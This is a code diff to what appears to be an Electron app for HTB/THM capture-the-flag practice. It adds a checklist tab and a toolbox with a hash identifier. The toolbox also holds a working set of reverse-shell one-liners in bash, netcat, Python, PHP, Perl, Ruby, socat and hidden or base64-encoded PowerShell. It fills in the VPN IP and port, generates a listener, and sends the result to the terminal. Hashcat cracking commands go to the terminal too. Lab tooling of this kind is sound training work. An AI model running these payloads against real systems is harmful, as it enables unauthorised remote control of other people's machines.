@@ -100,8 +100,8 @@ const DEFAULTS = {
   WORDLIST: '/usr/share/seclists/Discovery/Web-Content/common.txt',
   SUBLIST: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'
 }
-// per-box data (ports + creds), saved to workspaces/<box>/box.json
-const EMPTY_BOX = () => ({ ports: '', portsManual: false, creds: [], activeCred: -1 })
+// per-box data (ports + creds + checklist), saved to workspaces/<box>/box.json
+const EMPTY_BOX = () => ({ ports: '', portsManual: false, creds: [], activeCred: -1, checklist: [] })
 let box = EMPTY_BOX()
 function activeCred() { return box.creds[box.activeCred] || null }
 
@@ -278,9 +278,11 @@ $('delete-confirm').onclick = async () => {
 $('btn-reload').onclick = async () => { await flushNote(); location.reload() }
 
 // ---------- VPN STATUS (HTB/THM openvpn or wireguard) ----------
+let vpnIp = null   // last seen VPN IP, used as the default LHOST in the toolbox
 async function checkVpn() {
   const v = await api.invoke('check-vpn')
   const el = $('vpn-status')
+  vpnIp = v.connected ? v.ip : null
   if (v.connected) {
     el.className = 'pill ok'
     $('vpn-text').textContent = v.ip
@@ -738,7 +740,7 @@ function renderWhatweb(txt) {
 
 // ---------- NOTES / LOOT TABS ----------
 let activeTab = 'output'
-const tabButtons = { output: $('tab-output'), notes: $('tab-notes'), loot: $('tab-loot'), creds: $('tab-creds') }
+const tabButtons = { output: $('tab-output'), notes: $('tab-notes'), loot: $('tab-loot'), creds: $('tab-creds'), checklist: $('tab-checklist') }
 const notesView = $('notes-view')
 const lootView = $('loot-view')
 const savedMsg = $('note-saved-msg')
@@ -783,9 +785,11 @@ async function switchTab(tab) {
   notesView.classList.toggle('hidden', tab !== 'notes')
   lootView.classList.toggle('hidden', tab !== 'loot')
   $('creds-pane').classList.toggle('hidden', tab !== 'creds')
+  $('checklist-pane').classList.toggle('hidden', tab !== 'checklist')
   $('btn-refresh-output').classList.toggle('hidden', tab !== 'output')
   if (tab === 'notes' || tab === 'loot') { await loadNote(tab); (tab === 'notes' ? notesView : lootView).focus() }
   if (tab === 'creds') { renderCreds(); if (target.workspace) $('cred-user').focus() }
+  if (tab === 'checklist') { renderChecklist(); if (target.workspace) $('check-input').focus() }
 }
 for (const tab of Object.keys(tabButtons)) tabButtons[tab].onclick = () => switchTab(tab)
 window.addEventListener('beforeunload', () => { if (noteDirty) flushNote() })
@@ -793,7 +797,7 @@ window.addEventListener('beforeunload', () => { if (noteDirty) flushNote() })
 // ---------- BOX DATA (ports + creds) ----------
 async function loadBox() {
   box = target.workspace ? await api.invoke('read-box') : EMPTY_BOX()
-  renderPorts(); renderCreds(); updateTargetDisplay()
+  renderPorts(); renderCreds(); renderChecklist(); updateTargetDisplay()
   await autoPorts(true)
 }
 function saveBox() {
@@ -933,6 +937,64 @@ function addCred() {
 $('cred-add').onclick = addCred
 credInputs.forEach(i => i.addEventListener('keydown', (e) => { if (e.key === 'Enter') addCred() }))
 
+// ---------- CHECKLIST ----------
+const checkInput = $('check-input')
+function renderChecklist() {
+  const list = $('check-list')
+  const on = !!target.workspace
+  checkInput.disabled = !on
+  $('check-add').disabled = !on
+  $('check-reset').disabled = !on
+  const items = box.checklist || []
+  const done = items.filter(c => c.done).length
+  const pct = items.length ? Math.round(done / items.length * 100) : 0
+  $('check-bar').style.width = pct + '%'
+  $('check-bar').classList.toggle('full', pct === 100 && items.length > 0)
+  $('check-label').textContent = items.length ? `${done}/${items.length}` : ''
+  const badge = $('check-count')
+  badge.textContent = items.length ? `${done}/${items.length}` : ''
+  badge.classList.toggle('hidden', !items.length)
+  badge.classList.toggle('all-done', items.length > 0 && done === items.length)
+  list.innerHTML = ''
+  if (!on) { list.innerHTML = '<div class="empty">Pick or create a box first.</div>'; return }
+  if (!items.length) { list.innerHTML = '<div class="empty">No steps. Add one above, or reset to the default list.</div>'; return }
+  items.forEach((c, i) => {
+    const el = document.createElement('div')
+    el.className = 'check' + (c.done ? ' done' : '')
+    const boxEl = document.createElement('span')
+    boxEl.className = 'check-box'
+    boxEl.textContent = c.done ? '✓' : ''
+    const txt = document.createElement('span')
+    txt.className = 'check-text'
+    txt.textContent = c.text
+    const del = document.createElement('span')
+    del.className = 'check-del'; del.textContent = '×'; del.title = 'Remove this step'
+    del.onclick = (e) => { e.stopPropagation(); box.checklist.splice(i, 1); checklistChanged() }
+    el.append(boxEl, txt, del)
+    el.onclick = () => { c.done = !c.done; checklistChanged() }
+    list.appendChild(el)
+  })
+}
+function checklistChanged() { saveBox(); renderChecklist() }
+function addCheck() {
+  const text = checkInput.value.trim()
+  if (!text || !target.workspace) return
+  box.checklist.push({ text, done: false })
+  checkInput.value = ''
+  checklistChanged()
+}
+$('check-add').onclick = addCheck
+checkInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') addCheck() })
+$('check-reset').onclick = async () => {
+  if (!target.workspace) return
+  if (!confirm('Reset this box to the default checklist? Your current steps are replaced.')) return
+  box.checklist = undefined          // undefined -> main process re-seeds the template
+  await api.invoke('write-box', box)
+  box = await api.invoke('read-box')
+  renderChecklist()
+  toast('Checklist reset')
+}
+
 // ---------- FX (glow / scanlines / motion) ----------
 function applyFx(on) {
   document.body.classList.toggle('fx-off', !on)
@@ -946,6 +1008,133 @@ $('btn-fx').onclick = () => {
   applyFx(on)
   toast(on ? 'Effects on' : 'Effects off')
 }
+
+// ---------- TOOLBOX: reverse shells + hash ID ----------
+const tbModal = $('modal-toolbox')
+// %H / %P get replaced with host / port. Payloads are the common revshells set.
+const SHELLS = {
+  'bash-i':        `bash -c 'bash -i >& /dev/tcp/%H/%P 0>&1'`,
+  'bash-196':      `0<&196;exec 196<>/dev/tcp/%H/%P; sh <&196 >&196 2>&196`,
+  'sh':            `sh -i >& /dev/tcp/%H/%P 0>&1`,
+  'nc-mkfifo':     `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %H %P >/tmp/f`,
+  'nc-e':          `nc -e /bin/sh %H %P`,
+  'python3':       `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("%H",%P));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`,
+  'php':           `php -r '$sock=fsockopen("%H",%P);exec("/bin/sh -i <&3 >&3 2>&3");'`,
+  'perl':          `perl -e 'use Socket;$i="%H";$p=%P;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+  'ruby':          `ruby -rsocket -e'f=TCPSocket.open("%H",%P).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+  'socat':         `socat TCP:%H:%P EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
+  'powershell':    `powershell -nop -W hidden -noni -c "$c=New-Object System.Net.Sockets.TCPClient('%H',%P);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`
+}
+// PowerShell's -EncodedCommand wants the inner script as base64 of UTF-16LE
+function psEncode(host, port) {
+  const inner = SHELLS.powershell.replace(/^powershell -nop -W hidden -noni -c "/, '').replace(/"$/, '')
+    .replace(/%H/g, host).replace(/%P/g, port)
+  let bin = ''
+  for (const ch of inner) { const c = ch.charCodeAt(0); bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff) }
+  return 'powershell -nop -W hidden -e ' + btoa(bin)
+}
+function genShell() {
+  const host = $('tb-lhost').value.trim() || '<lhost>'
+  const port = ($('tb-lport').value.trim().match(/\d+/) || ['4444'])[0]
+  const type = $('tb-shell-type').value
+  const cmd = type === 'powershell-b64'
+    ? psEncode(host, port)
+    : SHELLS[type].replace(/%H/g, host).replace(/%P/g, port)
+  $('tb-shell-out').textContent = cmd
+  const listener = type === 'socat'
+    ? `socat -d -d TCP-LISTEN:${port},reuseaddr FILE:\`tty\`,raw,echo=0`
+    : `nc -lvnp ${port}`
+  $('tb-listen-out').textContent = listener
+  return { cmd, listener }
+}
+function openToolbox() {
+  if (vpnIp && !$('tb-lhost').value.trim()) $('tb-lhost').value = vpnIp
+  genShell()
+  tbModal.classList.remove('hidden')
+}
+$('btn-toolbox').onclick = openToolbox
+$('tb-close').onclick = () => tbModal.classList.add('hidden')
+;['tb-lhost', 'tb-lport'].forEach(id => $(id).addEventListener('input', genShell))
+$('tb-shell-type').addEventListener('change', genShell)
+function tbSubTab(which) {
+  $('tb-tab-shell').classList.toggle('active', which === 'shell')
+  $('tb-tab-hash').classList.toggle('active', which === 'hash')
+  $('tb-shell').classList.toggle('hidden', which !== 'shell')
+  $('tb-hash').classList.toggle('hidden', which !== 'hash')
+  if (which === 'hash') $('tb-hash-in').focus()
+}
+$('tb-tab-shell').onclick = () => tbSubTab('shell')
+$('tb-tab-hash').onclick = () => tbSubTab('hash')
+const sendToTerm = (text) => { api.send('term-insert', text); tbModal.classList.add('hidden'); term.focus(); toast('Sent to terminal') }
+const copyText = async (text) => { const ok = await api.invoke('copy-text', text); toast(ok ? 'Copied' : 'Copy failed') }
+$('tb-shell-copy').onclick = () => copyText(genShell().cmd)
+$('tb-shell-insert').onclick = () => sendToTerm(genShell().cmd)
+$('tb-listen-copy').onclick = () => copyText(genShell().listener)
+$('tb-listen-insert').onclick = () => sendToTerm(genShell().listener)
+
+// ---- hash identifier: regex rules, most specific first ----
+const HASH_RULES = [
+  { re: /^\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}$/, name: 'bcrypt', m: 3200, john: 'bcrypt' },
+  { re: /^\$6\$/, name: 'sha512crypt (Unix)', m: 1800, john: 'sha512crypt' },
+  { re: /^\$5\$/, name: 'sha256crypt (Unix)', m: 7400, john: 'sha256crypt' },
+  { re: /^\$1\$/, name: 'md5crypt (Unix)', m: 500, john: 'md5crypt' },
+  { re: /^\$apr1\$/, name: 'Apache apr1 (md5)', m: 1600, john: 'md5crypt' },
+  { re: /^\$y\$/, name: 'yescrypt', m: null, john: 'crypt' },
+  { re: /^\$krb5tgs\$23\$/, name: 'Kerberos 5 TGS-REP (RC4)', m: 13100, john: 'krb5tgs' },
+  { re: /^\$krb5asrep\$23\$/, name: 'Kerberos 5 AS-REP (RC4)', m: 18200, john: 'krb5asrep' },
+  { re: /^\$krb5tgs\$17\$/, name: 'Kerberos 5 TGS-REP (AES128)', m: 19600, john: 'krb5tgs' },
+  { re: /^\$krb5tgs\$18\$/, name: 'Kerberos 5 TGS-REP (AES256)', m: 19700, john: 'krb5tgs' },
+  { re: /^{SSHA}/, name: 'LDAP SSHA', m: 111, john: 'ssha' },
+  { re: /^\*[A-F0-9]{40}$/i, name: 'MySQL 4.1+ (SHA1)', m: 300, john: 'mysql-sha1' },
+  { re: /^[^\\/:*?"<>|]+::[^:]*:[a-f0-9]{16}:[a-f0-9]{32}:[a-f0-9]+$/i, name: 'NetNTLMv2', m: 5600, john: 'netntlmv2' },
+  { re: /^[a-f0-9]{32}:[a-f0-9]{32}$/i, name: 'NTLMv1 / double-MD5', m: 5500, john: 'netntlm' },
+  { re: /^[a-f0-9]{32}:.+$/i, name: 'md5($pass.$salt) or NTLM:salt', m: 10, john: 'dynamic' },
+  { re: /^[a-f0-9]{128}$/i, name: 'SHA-512', m: 1700, john: 'raw-sha512' },
+  { re: /^[a-f0-9]{96}$/i, name: 'SHA-384', m: 10800, john: 'raw-sha384' },
+  { re: /^[a-f0-9]{64}$/i, name: 'SHA-256', m: 1400, john: 'raw-sha256' },
+  { re: /^[a-f0-9]{56}$/i, name: 'SHA-224', m: 1300, john: 'raw-sha224' },
+  { re: /^[a-f0-9]{40}$/i, name: 'SHA-1', m: 100, john: 'raw-sha1' },
+  { re: /^[a-f0-9]{16}$/i, name: 'MySQL323', m: 200, john: 'mysql' },
+]
+// the 32-hex case is the big ambiguous one: MD5 vs NTLM vs more — list both
+const HEX32 = [
+  { name: 'MD5', m: 0, john: 'raw-md5' },
+  { name: 'NTLM', m: 1000, john: 'nt' },
+  { name: 'LM', m: 3000, john: 'lm' },
+  { name: 'MD4', m: 900, john: 'raw-md4' },
+]
+function idHash(h) {
+  h = h.trim()
+  if (!h) return []
+  if (/^[a-f0-9]{32}$/i.test(h)) return HEX32.slice()
+  for (const r of HASH_RULES) if (r.re.test(h)) return [r]
+  return []
+}
+function renderHashId() {
+  const h = $('tb-hash-in').value
+  const out = $('tb-hash-out')
+  const hits = idHash(h)
+  if (!h.trim()) { out.innerHTML = '<div class="empty">Paste a hash above.</div>'; return }
+  if (!hits.length) { out.innerHTML = '<div class="empty">No match. Could be salted or an unusual format — try hashid / name-that-hash.</div>'; return }
+  out.innerHTML = ''
+  hits.forEach(hit => {
+    const row = document.createElement('div')
+    row.className = 'hash-hit'
+    const mode = hit.m == null ? '—' : `-m ${hit.m}`
+    row.innerHTML = `<span class="hash-name">${esc(hit.name)}</span>` +
+      `<span class="hash-mode">hashcat ${esc(mode)}</span>` +
+      `<span class="hash-john">john --format=${esc(hit.john)}</span>`
+    if (hit.m != null) {
+      const b = document.createElement('button')
+      b.className = 'mini ghost'; b.textContent = 'crack'
+      b.title = 'Send a hashcat command to the terminal'
+      b.onclick = () => sendToTerm(`hashcat -m ${hit.m} '${h.trim().replace(/'/g, "")}' /usr/share/wordlists/rockyou.txt`)
+      row.appendChild(b)
+    }
+    out.appendChild(row)
+  })
+}
+$('tb-hash-in').addEventListener('input', renderHashId)
 
 // ---------- KEYBOARD ----------
 document.addEventListener('keydown', (e) => {
